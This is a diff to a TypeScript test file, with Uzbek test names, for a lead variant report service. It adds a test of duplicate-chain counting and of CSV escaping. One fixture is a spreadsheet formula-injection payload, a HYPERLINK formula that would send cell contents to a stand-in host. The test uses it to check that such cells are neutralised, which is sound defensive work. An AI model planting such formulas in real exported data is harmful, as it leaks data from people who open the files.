@@ -14,7 +14,7 @@ import { AddLeadReview1794960000000 } from './migrations/1794960000000-add-lead-
 import { AddLeadQueue1795046400000 } from './migrations/1795046400000-add-lead-queue';
 import { AddApiLeads1795132800000 } from './migrations/1795132800000-add-api-leads';
 import { AddLeadStats1795564800000 } from './migrations/1795564800000-add-lead-stats';
-import { VariantReportService } from './variant-report.service';
+import { csvCell, VariantReportService } from './variant-report.service';
 
 const testDatabaseUrl = process.env.TEST_DATABASE_URL;
 const describeWithPostgres = testDatabaseUrl ? describe : describe.skip;
@@ -287,6 +287,52 @@ describeWithPostgres('BE-39 S1 va S3 sinovi hisoboti (PostgreSQL)', () => {
     ).rejects.toMatchObject({ status: 400 });
     await expect(
       svc.report({ from: '2027-1-1', to: '2027-01-10' }),
+    ).rejects.toMatchObject({ status: 400 });
+  });
+  it('dublikat zanjiri oxirgi asosiy lidgacha; CSV: formula katagi apostrof bilan, foiz vergul bilan; mavjud bo‘lmagan sana — 400', async () => {
+    const a = await stream('cccccc', '501');
+    const roots: Lead[] = [];
+    for (let i = 0; i < 5; i++) roots.push(await lead(a.id, LeadVariant.S3));
+    // Operator «Dublikat»: variantsiz A (S3 asosiy lidga), unga avval qo‘shilgan S1 ariza D → hammasi S3 da
+    const mid = await lead(a.id, null, {
+      status: LeadStatus.MERGED,
+      mergedIntoId: roots[0].id,
+    });
+    await lead(a.id, LeadVariant.S1, {
+      status: LeadStatus.MERGED,
+      mergedIntoId: mid.id,
+    });
+    const r = await report();
+    const s3 = r.rows.find(
+      (x) => x.variant === LeadVariant.S3 && x.productId === '501',
+    );
+    expect(s3).toMatchObject({
+      applications: 7,
+      duplicates: 2,
+      duplicateRate: 28.6,
+    });
+    expect(
+      r.rows.find((x) => x.variant === LeadVariant.S1 && x.productId === '501'),
+    ).toBeUndefined();
+
+    catalogFake.list.mockResolvedValueOnce([
+      { productId: '501', name: '=HYPERLINK("http://x?"&A1;"bos")' },
+    ] as never);
+    const csv = await new VariantReportService(db, catalogFake as never).csv({
+      from: '2027-01-10',
+      to: '2027-01-11',
+    });
+    const line = csv.content.split('\r\n').find((l) => l.startsWith('S3;501;'));
+    expect(line).toBe(
+      `S3;501;"'=HYPERLINK(""http://x?""&A1;""bos"")";0;7;2;28,6;5;0;0;0;0;0;;`,
+    );
+    expect(csvCell('-1')).toBe("'-1");
+    expect(csvCell('a\rb')).toBe('"a\rb"');
+    await expect(
+      new VariantReportService(db, catalogFake as never).report({
+        from: '2027-02-01',
+        to: '2027-02-31',
+      }),
     ).rejects.toMatchObject({ status: 400 });
   });
 });
